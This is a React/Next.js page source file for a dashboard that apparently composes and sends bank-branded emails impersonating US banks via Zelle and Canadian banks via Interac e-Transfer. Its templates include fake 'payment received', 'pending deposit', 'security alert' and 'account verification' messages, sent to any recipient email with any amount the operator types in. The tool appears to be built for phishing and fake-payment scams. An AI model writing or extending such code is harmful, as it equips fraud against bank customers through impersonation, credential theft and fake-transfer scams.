"use client"

import { useState, useEffect } from "react"
import Image from "next/image"
import DashboardShellWithAuth from "@/components/DashboardShell"
import { searchBanks } from "@/services/bankService"
import { getBankColor } from "@/lib/email-template"
import type { Bank } from "@/types/bank"
import {
  DollarSign,
  Clock,
  ShieldAlert,
  BadgeCheck,
  ChevronRight,
  Mail,
  Send,
  Globe,
  CheckCircle2,
} from "lucide-react"

// ── Types ──────────────────────────────────────────────────────────────────

type CountryCode = "us" | "ca"

interface RegionDef {
  code: CountryCode
  label: string
  fullName: string
  flag: string
  accentColor: string
  tagline: string
}

interface TemplateDef {
  id: string
  label: string
  description: string
  icon: React.ElementType
  iconColor: string
  country: CountryCode | "both"
}

// ── Constants ──────────────────────────────────────────────────────────────

const REGIONS: RegionDef[] = [
  {
    code: "us",
    label: "United States",
    fullName: "United States",
    flag: "🇺🇸",
    accentColor: "#3b82f6",
    tagline: "Zelle-powered US bank templates",
  },
  {
    code: "ca",
    label: "Canada",
    fullName: "Canada",
    flag: "🇨🇦",
    accentColor: "#ef4444",
    tagline: "Interac e-Transfer branded templates",
  },
]

const TEMPLATES: TemplateDef[] = [
  {
    id: "bank-payment",
    label: "Global Payments Received",
    description: "Notify recipient of an incoming international wire via the Zelle network.",
    icon: DollarSign,
    iconColor: "#10b981",
    country: "us",
  },
  {
    id: "bank-pending-deposit",
    label: "Pending Deposit",
    description: "Alert recipient that a deposit is pending and requires their acceptance.",
    icon: Clock,
    iconColor: "#f59e0b",
    country: "us",
  },
  {
    id: "bank-security-alert",
    label: "Security Alert",
    description: "Flag unusual account activity and prompt the recipient to secure their account.",
    icon: ShieldAlert,
    iconColor: "#ef4444",
    country: "both",
  },
  {
    id: "bank-account-verify",
    label: "Account Verification",
    description: "Request identity verification to activate Zelle on the recipient's account.",
    icon: BadgeCheck,
    iconColor: "#3b82f6",
    country: "both",
  },
  {
    id: "interac-payment",
    label: "Interac e-Transfer Received",
    description: "Notify recipient of an incoming Interac e-Transfer to their Canadian bank account.",
    icon: DollarSign,
    iconColor: "#FFB800",
    country: "ca",
  },
  {
    id: "interac-pending",
    label: "Interac Pending Transfer",
    description: "Alert recipient that an Interac e-Transfer is pending and awaiting deposit.",
    icon: Clock,
    iconColor: "#f59e0b",
    country: "ca",
  },
]

// Canadian banks that support Interac e-Transfer
const CA_BANKS = [
  { id: "rbc",   name: "RBC Royal Bank",       accentColor: "#003168", initial: "R" },
  { id: "td-ca", name: "TD Canada Trust",       accentColor: "#34A853", initial: "T" },
  { id: "bmo",   name: "BMO Bank of Montreal",  accentColor: "#0075BE", initial: "B" },
  { id: "cibc",  name: "CIBC",                  accentColor: "#C41F3E", initial: "C" },
  { id: "scotiabank", name: "Scotiabank",        accentColor: "#EC111A", initial: "S" },
  { id: "nbc",   name: "National Bank",          accentColor: "#EA002A", initial: "N" },
  { id: "desjardins", name: "Desjardins",        accentColor: "#007A53", initial: "D" },
  { id: "tangerine", name: "Tangerine",          accentColor: "#FF6600", initial: "T" },
]

// ── Page ───────────────────────────────────────────────────────────────────

function RegionalTemplatesContent() {
  const [activeRegion, setActiveRegion] = useState<CountryCode>("us")
  const [usBanks, setUsBanks] = useState<Bank[]>([])
  const [selectedBank, setSelectedBank] = useState<string | null>(null)
  const [selectedTemplate, setSelectedTemplate] = useState<string>("bank-payment")
  const [brokenImages, setBrokenImages] = useState<Set<string>>(new Set())
  const [composerOpen, setComposerOpen] = useState(false)
  const [sent, setSent] = useState<Set<string>>(new Set())

  useEffect(() => {
    searchBanks("").then(setUsBanks).catch(() => setUsBanks([]))
  }, [])

  // When switching regions, reset selection to first available template
  useEffect(() => {
    const first = TEMPLATES.find(
      (t) => t.country === activeRegion || t.country === "both"
    )
    if (first) setSelectedTemplate(first.id)
    setSelectedBank(null)
  }, [activeRegion])

  const region = REGIONS.find((r) => r.code === activeRegion)!
  const visibleTemplates = TEMPLATES.filter(
    (t) => t.country === activeRegion || t.country === "both"
  )
  const banks = activeRegion === "us" ? usBanks : CA_BANKS

  const handleSelectTemplate = (tplId: string, bankId: string) => {
    setSelectedTemplate(tplId)
    setSelectedBank(bankId)
    setComposerOpen(true)
  }

  const handleMarkSent = (key: string) => {
    setSent((p) => new Set(p).add(key))
    setTimeout(() => {
      setSent((p) => {
        const n = new Set(p)
        n.delete(key)
        return n
      })
    }, 3000)
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a]">
      {/* Page header */}
      <div className="px-6 pt-6 pb-4 border-b border-zinc-800">
        <div className="flex items-center gap-3 mb-1">
          <Globe className="w-5 h-5 text-[#6D1ED4]" />
          <h1 className="text-xl font-bold text-white">Regional Templates</h1>
        </div>
        <p className="text-sm text-zinc-400">
          Country-specific branded email templates for US banks and Canadian Interac e-Transfers.
        </p>
      </div>

      <div className="flex min-h-[calc(100vh-108px)]">
        {/* ── LEFT SIDEBAR: country selector ───────────────────────────── */}
        <aside className="w-56 flex-shrink-0 border-r border-zinc-800 p-4 space-y-1">
          <p className="text-[10px] font-semibold uppercase tracking-widest text-zinc-600 px-2 mb-3">
            Select Region
          </p>
          {REGIONS.map((r) => {
            const isActive = activeRegion === r.code
            return (
              <button
                key={r.code}
                onClick={() => setActiveRegion(r.code)}
                className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-left transition-all group ${
                  isActive
                    ? "bg-zinc-800 ring-1 ring-zinc-700"
                    : "hover:bg-zinc-800/50"
                }`}
              >
                <span className="text-2xl leading-none select-none">{r.flag}</span>
                <div className="flex-1 min-w-0">
                  <div className={`text-sm font-medium truncate ${isActive ? "text-white" : "text-zinc-300"}`}>
                    {r.label}
                  </div>
                  <div className="text-[10px] text-zinc-600 truncate mt-0.5">{r.tagline}</div>
                </div>
                {isActive && (
                  <div
                    className="w-1.5 h-1.5 rounded-full flex-shrink-0"
                    style={{ background: r.accentColor }}
                  />
                )}
              </button>
            )
          })}

          {/* Region branding block */}
          <div className="mt-6 pt-4 border-t border-zinc-800">
            <p className="text-[10px] font-semibold uppercase tracking-widest text-zinc-600 px-2 mb-3">
              Network
            </p>
            {activeRegion === "us" ? (
              <div className="rounded-lg border border-zinc-700/50 bg-zinc-900 p-3">
                <div className="text-xs font-semibold text-white mb-1">Zelle Network</div>
                <div className="text-[10px] text-zinc-500 leading-relaxed">
                  Real-time payments between enrolled US bank accounts.
                </div>
                <div
                  className="mt-2 inline-block text-[9px] font-bold uppercase tracking-wider px-2 py-0.5 rounded-full text-white"
                  style={{ background: "#6D1ED4" }}
                >
                  Active
                </div>
              </div>
            ) : (
              <div className="rounded-lg border border-zinc-700/50 bg-zinc-900 p-3">
                <div className="w-20 h-8 bg-white rounded mb-2 flex items-center justify-center overflow-hidden">
                  <Image
                    src="/interac-logo.jpg"
                    alt="Interac"
                    width={72}
                    height={28}
                    className="object-contain"
                  />
                </div>
                <div className="text-[10px] text-zinc-500 leading-relaxed">
                  Interac e-Transfer for Canadian bank-to-bank payments.
                </div>
                <div className="mt-2 inline-block text-[9px] font-bold uppercase tracking-wider px-2 py-0.5 rounded-full text-white bg-red-600">
                  CA Only
                </div>
              </div>
            )}
          </div>
        </aside>

        {/* ── MAIN CONTENT ───────────────────────────────────────────────── */}
        <div className="flex-1 p-6 overflow-auto">
          {/* Region header badge */}
          <div className="flex items-center gap-3 mb-5">
            <span className="text-3xl">{region.flag}</span>
            <div>
              <h2 className="text-base font-bold text-white">{region.fullName} Templates</h2>
              <p className="text-xs text-zinc-400">{region.tagline}</p>
            </div>
            <div
              className="ml-auto text-xs font-semibold px-3 py-1 rounded-full border"
              style={{ color: region.accentColor, borderColor: `${region.accentColor}40`, background: `${region.accentColor}10` }}
            >
              {banks.length} {activeRegion === "ca" ? "institutions" : "banks"} available
            </div>
          </div>

          {/* Template × Bank grid */}
          {visibleTemplates.map((tpl) => {
            const Icon = tpl.icon
            return (
              <div key={tpl.id} className="mb-8">
                {/* Template header */}
                <div className="flex items-center gap-2.5 mb-3">
                  <div
                    className="w-7 h-7 rounded-md flex items-center justify-center flex-shrink-0"
                    style={{ background: `${tpl.iconColor}20` }}
                  >
                    <Icon className="w-4 h-4" style={{ color: tpl.iconColor }} />
                  </div>
                  <div>
                    <span className="text-sm font-semibold text-white">{tpl.label}</span>
                    <span className="ml-2 text-xs text-zinc-500">{tpl.description}</span>
                  </div>
                </div>

                {/* Bank cards for this template */}
                <div className="grid grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-3">
                  {(banks as (Bank | typeof CA_BANKS[0])[]).map((bank) => {
                    const bankId = bank.id
                    const cardKey = `${tpl.id}:${bankId}`
                    const isSent = sent.has(cardKey)
                    const isSelected = selectedTemplate === tpl.id && selectedBank === bankId
                    const color =
                      activeRegion === "us"
                        ? getBankColor(bankId)
                        : (bank as typeof CA_BANKS[0]).accentColor ?? "#6D1ED4"
                    const logo =
                      activeRegion === "us"
                        ? (bank as Bank).logo
                        : activeRegion === "ca"
                        ? "/interac-logo.jpg"
                        : undefined
                    const isInterac = activeRegion === "ca"

                    return (
                      <button
                        key={bankId}
                        onClick={() => handleSelectTemplate(tpl.id, bankId)}
                        className={`relative rounded-xl border text-left transition-all group overflow-hidden focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2 focus:ring-offset-[#0a0a0a] ${
                          isSelected
                            ? "border-[#6D1ED4]/60 bg-[#6D1ED4]/8 ring-1 ring-[#6D1ED4]/30"
                            : "border-zinc-800 bg-zinc-900 hover:border-zinc-700 hover:bg-zinc-800/60"
                        }`}
                      >
                        {/* Color accent strip */}
                        <div
                          className="h-1 w-full"
                          style={{ background: color }}
                        />

                        <div className="p-3">
                          {/* Logo + bank name */}
                          <div className="flex items-center gap-2.5 mb-3">
                            <div
                              className="w-9 h-9 rounded-md bg-white flex items-center justify-center overflow-hidden flex-shrink-0 border border-zinc-200/10"
                            >
                              {logo && !brokenImages.has(bankId) ? (
                                <Image
                                  src={isInterac ? "/interac-logo.jpg" : logo}
                                  alt={bank.name}
                                  width={36}
                                  height={36}
                                  className="object-contain w-full h-full p-0.5"
                                  onError={() => setBrokenImages((p) => new Set(p).add(bankId))}
                                />
                              ) : (
                                <div
                                  className="w-full h-full flex items-center justify-center text-white font-bold text-sm"
                                  style={{ background: color }}
                                >
                                  {(bank as typeof CA_BANKS[0]).initial ?? bank.name.charAt(0)}
                                </div>
                              )}
                            </div>
                            <div className="flex-1 min-w-0">
                              <div className="text-xs font-semibold text-white truncate">{bank.name}</div>
                              {isInterac && (
                                <div className="text-[9px] text-zinc-500 truncate">via Interac e-Transfer</div>
                              )}
                            </div>
                          </div>

                          {/* Interac badge for CA */}
                          {isInterac && (
                            <div className="flex items-center gap-1 mb-2">
                              <div className="w-4 h-4 rounded bg-white flex items-center justify-center overflow-hidden flex-shrink-0">
                                <Image
                                  src="/interac-logo.jpg"
                                  alt="Interac"
                                  width={14}
                                  height={14}
                                  className="object-contain"
                                />
                              </div>
                              <span className="text-[9px] text-zinc-500 font-medium uppercase tracking-wider">Interac Branded</span>
                            </div>
                          )}

                          {/* CTA row */}
                          <div className="flex items-center justify-between">
                            {isSent ? (
                              <div className="flex items-center gap-1 text-emerald-400 text-xs font-medium">
                                <CheckCircle2 className="w-3 h-3" />
                                Opened
                              </div>
                            ) : (
                              <div
                                className="flex items-center gap-1 text-xs font-medium opacity-0 group-hover:opacity-100 transition-opacity"
                                style={{ color }}
                              >
                                <Mail className="w-3 h-3" />
                                Compose
                              </div>
                            )}
                            <ChevronRight className="w-3.5 h-3.5 text-zinc-600 group-hover:text-zinc-300 transition-colors" />
                          </div>
                        </div>
                      </button>
                    )
                  })}
                </div>
              </div>
            )
          })}
        </div>

        {/* ── RIGHT DRAWER: compose panel ─────────────────────────────── */}
        {composerOpen && selectedBank && (
          <ComposeDrawer
            region={region}
            template={TEMPLATES.find((t) => t.id === selectedTemplate)!}
            bank={
              activeRegion === "us"
                ? usBanks.find((b) => b.id === selectedBank) ?? null
                : CA_BANKS.find((b) => b.id === selectedBank) ?? null
            }
            isInterac={activeRegion === "ca"}
            onClose={() => setComposerOpen(false)}
            onSent={(key) => handleMarkSent(key)}
          />
        )}
      </div>
    </div>
  )
}

// ── Compose drawer ─────────────────────────────────────────────────────────

interface ComposeDrawerProps {
  region: RegionDef
  template: TemplateDef
  bank: Bank | typeof CA_BANKS[0] | null
  isInterac: boolean
  onClose: () => void
  onSent: (key: string) => void
}

function ComposeDrawer({ region, template, bank, isInterac, onClose, onSent }: ComposeDrawerProps) {
  const [recipientName, setRecipientName] = useState("")
  const [recipientEmail, setRecipientEmail] = useState("")
  const [amount, setAmount] = useState("")
  const [status, setStatus] = useState<"idle" | "sending" | "success" | "error">("idle")
  const [errorMsg, setErrorMsg] = useState("")

  const Icon = template.icon
  const color = isInterac
    ? (bank as typeof CA_BANKS[0])?.accentColor ?? "#FFB800"
    : bank
    ? getBankColor((bank as Bank).id)
    : "#6D1ED4"

  const handleSend = async () => {
    if (!recipientEmail) { setErrorMsg("Recipient email is required."); setStatus("error"); return }
    if (!recipientName) { setErrorMsg("Recipient name is required."); setStatus("error"); return }
    setStatus("sending"); setErrorMsg("")

    try {
      const res = await fetch("/api/send-bank-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          recipientEmail,
          recipientName,
          bankId: bank?.id ?? "unknown",
          bankName: bank?.name ?? region.fullName,
          bankLogo: isInterac
            ? "/interac-logo.jpg"
            : (bank as Bank)?.logo ?? undefined,
          bankColor: color,
          template: template.id,
          amount: amount || "1,000.00",
        }),
      })
      if (!res.ok) {
        const d = await res.json()
        throw new Error(d.error ?? "Failed to send")
      }
      setStatus("success")
      onSent(`${template.id}:${bank?.id}`)
      setTimeout(() => setStatus("idle"), 4000)
    } catch (e) {
      setStatus("error")
      setErrorMsg(e instanceof Error ? e.message : "Failed to send email")
    }
  }

  return (
    <div className="w-72 flex-shrink-0 border-l border-zinc-800 bg-zinc-900 flex flex-col">
      {/* Drawer header */}
      <div className="flex items-center justify-between px-4 py-3 border-b border-zinc-800">
        <div className="flex items-center gap-2">
          <div
            className="w-6 h-6 rounded flex items-center justify-center"
            style={{ background: `${template.iconColor}20` }}
          >
            <Icon className="w-3.5 h-3.5" style={{ color: template.iconColor }} />
          </div>
          <span className="text-sm font-semibold text-white truncate max-w-[160px]">{template.label}</span>
        </div>
        <button
          onClick={onClose}
          className="text-zinc-500 hover:text-white transition-colors text-xs"
          aria-label="Close composer"
        >
          ✕
        </button>
      </div>

      {/* Selected bank */}
      {bank && (
        <div className="px-4 py-3 border-b border-zinc-800 flex items-center gap-2.5">
          <div className="w-8 h-8 rounded bg-white flex items-center justify-center overflow-hidden flex-shrink-0">
            {isInterac ? (
              <Image src="/interac-logo.jpg" alt="Interac" width={32} height={32} className="object-contain w-full h-full p-0.5" />
            ) : (bank as Bank).logo ? (
              <Image src={(bank as Bank).logo!} alt={bank.name} width={32} height={32} className="object-contain w-full h-full p-0.5" />
            ) : (
              <div className="w-full h-full flex items-center justify-center font-bold text-white text-xs" style={{ background: color }}>
                {bank.name.charAt(0)}
              </div>
            )}
          </div>
          <div>
            <div className="text-xs font-semibold text-white">{bank.name}</div>
            <div className="text-[10px] text-zinc-500">{region.flag} {region.fullName}</div>
          </div>
          {isInterac && (
            <div className="ml-auto">
              <div className="w-10 h-5 bg-white rounded flex items-center justify-center overflow-hidden">
                <Image src="/interac-logo.jpg" alt="Interac" width={36} height={16} className="object-contain" />
              </div>
            </div>
          )}
        </div>
      )}

      {/* Form */}
      <div className="flex-1 overflow-y-auto p-4 space-y-3">
        <div>
          <label className="block text-[10px] font-medium text-zinc-500 mb-1">Recipient Name *</label>
          <input
            type="text"
            placeholder="Full name"
            value={recipientName}
            onChange={(e) => setRecipientName(e.target.value)}
            className="w-full h-8 px-3 rounded-md bg-zinc-800 border border-zinc-700 text-sm text-white placeholder:text-zinc-600 focus:outline-none focus:ring-1 focus:ring-[#6D1ED4]"
          />
        </div>
        <div>
          <label className="block text-[10px] font-medium text-zinc-500 mb-1">Recipient Email *</label>
          <input
            type="email"
            placeholder="recipient@example.com"
            value={recipientEmail}
            onChange={(e) => setRecipientEmail(e.target.value)}
            className="w-full h-8 px-3 rounded-md bg-zinc-800 border border-zinc-700 text-sm text-white placeholder:text-zinc-600 focus:outline-none focus:ring-1 focus:ring-[#6D1ED4]"
          />
        </div>

        {/* Amount — editable */}
        <div>
          <label className="block text-[10px] font-medium text-zinc-500 mb-1">
            Amount ({region.code === "ca" ? "CAD" : "USD"}) *
          </label>
          <div className="relative flex items-center">
            <DollarSign className="absolute left-2.5 w-3 h-3 text-zinc-400 pointer-events-none" />
            <input
              type="text"
              inputMode="decimal"
              placeholder="e.g. 1,500.00"
              value={amount}
              onChange={(e) => {
                const raw = e.target.value.replace(/[^0-9.,]/g, "")
                setAmount(raw)
                if (status === "error") { setErrorMsg("") }
              }}
              className="w-full h-8 pl-7 pr-12 rounded-md bg-zinc-800 border border-zinc-700 text-sm text-white placeholder:text-zinc-600 focus:outline-none focus:ring-1 focus:ring-[#6D1ED4]"
            />
            <span className="absolute right-2.5 text-[9px] font-semibold text-zinc-500 uppercase tracking-wider pointer-events-none">
              {region.code === "ca" ? "CAD" : "USD"}
            </span>
          </div>
        </div>

        {/* Status messages */}
        {status === "error" && errorMsg && (
          <div className="text-xs text-red-400 bg-red-950/40 border border-red-800/40 rounded-lg px-3 py-2">
            {errorMsg}
          </div>
        )}
        {status === "success" && (
          <div className="flex items-center gap-2 text-xs text-emerald-400 bg-emerald-950/40 border border-emerald-800/40 rounded-lg px-3 py-2">
            <CheckCircle2 className="w-3.5 h-3.5" />
            Email sent successfully.
          </div>
        )}
      </div>

      {/* Send button */}
      <div className="p-4 border-t border-zinc-800">
        <button
          onClick={handleSend}
          disabled={status === "sending"}
          className="w-full flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-semibold text-white transition-all disabled:opacity-60 disabled:cursor-not-allowed focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-zinc-900"
          style={{ background: color, ["--tw-ring-color" as string]: color }}
        >
          {status === "sending" ? (
            <span className="flex items-center gap-2">
              <span className="w-3.5 h-3.5 border-2 border-white border-t-transparent rounded-full animate-spin" />
              Sending…
            </span>
          ) : (
            <>
              <Send className="w-3.5 h-3.5" />
              Send {isInterac ? "via Interac" : "via Zelle"}
            </>
          )}
        </button>
      </div>
    </div>
  )
}

// ── Export ─────────────────────────────────────────────────────────────────

export default function RegionalTemplatesPage() {
  return (
    <DashboardShellWithAuth>
      <RegionalTemplatesContent />
    </DashboardShellWithAuth>
  )
}
